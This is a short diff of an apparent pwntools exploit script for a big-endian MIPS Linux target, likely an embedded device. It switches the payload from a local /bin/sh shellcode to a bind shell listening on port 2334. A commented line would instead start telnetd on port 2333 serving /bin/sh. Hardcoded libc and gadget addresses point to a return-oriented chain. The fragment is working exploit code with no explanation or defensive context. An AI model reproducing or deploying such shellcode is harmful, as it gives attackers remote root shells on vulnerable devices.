@@ -44,7 +44,8 @@ if __name__ == '__main__':
     context.arch = "mips"
     context.endian = "big"
     #shellcode = asm(shellcraft.execve(path = "/bin/sh",argv=['sh', '-c', 'telnetd -p 2333 -l /bin/sh']))
-    shellcode = asm(shellcraft.mips.linux.sh())
+    #shellcode = asm(shellcraft.mips.linux.sh())
+    shellcode = asm(shellcraft.mips.linux.bindsh(2334))
     libc_addr = 0x90063000
     addr1 =  0x000512C0
     addr2 = 0x00035348
